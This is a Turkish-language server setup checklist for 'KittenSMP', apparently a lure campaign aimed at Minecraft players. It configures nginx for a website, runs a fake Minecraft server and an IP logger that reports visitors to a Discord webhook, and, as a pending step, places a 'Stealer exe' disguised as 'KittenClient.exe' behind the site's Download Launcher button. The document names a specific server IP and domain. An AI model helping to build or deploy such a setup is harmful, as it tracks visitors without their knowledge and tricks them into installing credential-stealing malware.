# KittenSMP - VDS Kurulum Listesi

## Dosyalar
```
Website/
  kitten/          ← web sitesi dosyaları
  mc_server.py     ← fake Minecraft server
  tracker.py       ← IP logger (Discord webhook)
```

---

## 1. VDS'e Bağlan
```bash
ssh root@188.240.81.28
```

---

## 2. Gerekli Paketleri Kur
```bash
apt update && apt install -y nginx python3-pip
pip install flask requests
```

---

## 3. Dosyaları VDS'e At
Kendi bilgisayarından:
```bash
scp -r kitten/ root@188.240.81.28:/var/www/kittensmp
scp mc_server.py tracker.py root@188.240.81.28:/opt/
```

---

## 4. Nginx Ayarı
```bash
nano /etc/nginx/sites-available/kittensmp
```
İçine yapıştır:
```nginx
server {
    listen 80;
    server_name kittensmp.com www.kittensmp.com;
    root /var/www/kittensmp;
    index index.html;

    location /track {
        proxy_pass http://127.0.0.1:5000/track;
        proxy_set_header X-Forwarded-For $remote_addr;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```
```bash
ln -s /etc/nginx/sites-available/kittensmp /etc/nginx/sites-enabled/
nginx -t && systemctl reload nginx
```

---

## 5. Minecraft Fake Server - Servis Kur
```bash
nano /etc/systemd/system/mc-fake.service
```
```ini
[Unit]
Description=KittenSMP Fake MC Server
After=network.target

[Service]
ExecStart=/usr/bin/python3 /opt/mc_server.py
Restart=always

[Install]
WantedBy=multi-user.target
```
```bash
systemctl daemon-reload
systemctl enable --now mc-fake
```

---

## 6. IP Tracker - Servis Kur
```bash
nano /etc/systemd/system/kittensmp-tracker.service
```
```ini
[Unit]
Description=KittenSMP IP Tracker
After=network.target

[Service]
ExecStart=/usr/bin/python3 /opt/tracker.py
Restart=always

[Install]
WantedBy=multi-user.target
```
```bash
systemctl daemon-reload
systemctl enable --now kittensmp-tracker
```

---

## 7. Download Butonu (YAPILMADI - bekliyor)
- [ ] Stealer exe'yi `/var/www/kittensmp/` içine koy (örn: `KittenClient.exe`)
- [ ] `index.html`'deki Download butonunu bağla:
```html
<a href="KittenClient.exe" download class="btn-primary large">
    <i class="fa-solid fa-download"></i> Download Launcher
</a>
```

---

## 8. Kontrol Et
```bash
# Servisler çalışıyor mu?
systemctl status mc-fake
systemctl status kittensmp-tracker

# Port açık mı?
ss -tlnp | grep -E "80|25565|5000"
```

---

## Özet - Ne Ne Yapıyor?
| Servis | Port | Görev |
|---|---|---|
| nginx | 80 | Web sitesi (`kittensmp.com`) |
| mc_server.py | 25565 | Fake Minecraft server (`play.kittensmp.com`) |
| tracker.py | 5000 (iç) | IP logger → Discord webhook |

## DNS (turkticaret'te zaten yapıldı ✅)
| Kayıt | Ad | Değer |
|---|---|---|
| A | kittensmp.com | 188.240.81.28 |
| CNAME | www.kittensmp.com | kittensmp.com |
| A | play.kittensmp.com | 188.240.81.28 |
